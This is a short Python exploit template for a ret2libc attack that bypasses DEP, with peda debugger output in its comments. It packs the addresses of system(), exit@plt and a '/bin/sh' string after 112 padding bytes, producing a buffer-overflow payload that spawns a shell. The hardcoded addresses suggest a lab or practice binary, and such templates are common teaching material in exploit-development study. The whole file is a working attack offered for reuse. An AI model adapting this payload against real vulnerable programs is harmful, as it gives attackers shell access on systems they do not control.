#!/usr/bin/env python
#===========================================================
# Template script to for ret2glibc for dep bypass
#===========================================================
import struct

# peda> p system
#	$1 = {<text variable, no debug info>} 0xb7e62310 <__libc_system>
system_addr = struct.pack("<I", 0xb7e62310)

# peda> disass main
# Dump of assembler code for function main:
#   0x080484a8 <+43>:    call   0x8048360 <exit@plt>

exit_addr = struct.pack("<I", 0x8048360)

# peda> searchmem /bin/sh
#       Searching for '/bin/sh' in: None ranges
#       Found 1 results, display max 1 items:
#       libc : 0xb7f84d4c ("/bin/sh")
arg_addr = struct.pack("<I", 0xb7f84d4c)

# Create payload
buf = 'A' * 112
buf += system_addr
buf += exit_addr
buf += arg_addr

print buf
